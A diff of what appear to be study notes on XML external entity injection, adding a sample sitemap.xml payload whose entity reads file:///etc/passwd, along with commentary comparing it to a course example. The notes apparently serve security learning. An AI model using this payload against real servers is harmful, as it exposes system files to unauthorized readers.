@@ -62,9 +62,27 @@ We want to ensure that we also query for our target file. If we are targeting `/
 
 
 
-Let's go back to our example quickly.
+Let's go back to our example quickly.![[Screenshot From 2025-03-06 16-55-20.png]]
 
-We'll copy our payload and compare it to the example from our presentation.
+We'll copy our above payload and compare it to the example from our smaple file(sitemap.xml)
+
+```
+
+
+<!DOCTYPE foo [ <!ELEMENT foo ANY >
+
+        <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+
+<urlset>
+
+    <url>
+
+        <loc>&xxe;</loc>
+
+    </url>
+
+</urlset>
+```
 
 We can see that we already have the XML declaration, which we don't need in this case. This is usually included by default in an XML file.
 
